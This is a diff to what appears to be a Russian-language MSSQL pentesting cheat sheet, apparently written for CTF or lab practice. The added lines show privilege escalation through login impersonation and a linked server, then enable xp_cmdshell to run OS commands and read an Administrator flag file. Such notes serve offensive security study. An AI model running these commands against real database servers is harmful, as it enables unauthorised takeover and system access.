@@ -131,8 +131,30 @@ exec xp_dirtree 'c:/';
        SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = 'flagDB';
        SELECT * FROM tb_flag;
 
+* Проверить есть ли пользователи с правами олицетворения
 
-       
+      SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
+* Давайте переключимся на пользователя john и проверьте его привилегии.
+
+       EXECUTE AS LOGIN = 'john';
+       SELECT SYSTEM_USER
+       SELECT IS_SRVROLEMEMBER('sysadmin')
+  
+        Джон не имеет прав системного администратора напрямую, но мы можем использовать связанный сервер для повышения наших прав. 
+        EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+
+* Давайте проверим наличие локального связанного сервера
+
+      SELECT srvname, isremote FROM sysservers
+  мы его нашли и
+
+      EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
+        EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+        EXEC ('sp_configure ''xp_cmdshell'',1') AT [LOCAL.TEST.LINKED.SRV]
+        EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+          EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
+      EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+***************************************************************************************
        select name from sys.databases;  (перечислить все базы данных)
 
        select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;
